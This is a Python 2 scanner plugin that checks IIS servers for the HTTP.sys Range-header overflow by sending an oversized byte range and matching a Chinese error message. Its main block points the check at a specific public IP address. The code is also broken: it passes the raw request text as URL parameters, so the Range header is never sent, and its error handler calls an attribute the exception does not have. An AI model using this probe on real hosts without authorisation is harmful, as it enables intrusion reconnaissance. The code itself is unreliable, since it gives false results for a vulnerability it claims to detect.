#!/usr/bin/env python
# encoding: utf-8
from t import T
import re
import urllib2,requests,urllib2,json,urlparse




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=3
        if port == 443:
            protocal = "https"
        else:
            protocal = "http"
        target_url = protocal + "://"+ip+":"+str(port)


        result = {}
        result['result']=False
        r=None

        vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n"

        try:


            r=requests.get(url=target_url,params=vuln_buffer,timeout=timeout)
            print r.content
            if "请求范围不符合" in r.content:


                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='iis Vulnerability'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=vuln_buffer
                result['VerifyInfo']['result'] =r.content
        except Exception,e:
            print e.text
        finally:
            if r is not None:
                r.close()
                del r
            return result



if __name__ == '__main__':
    print P().verify(ip='125.71.1.238',port='80')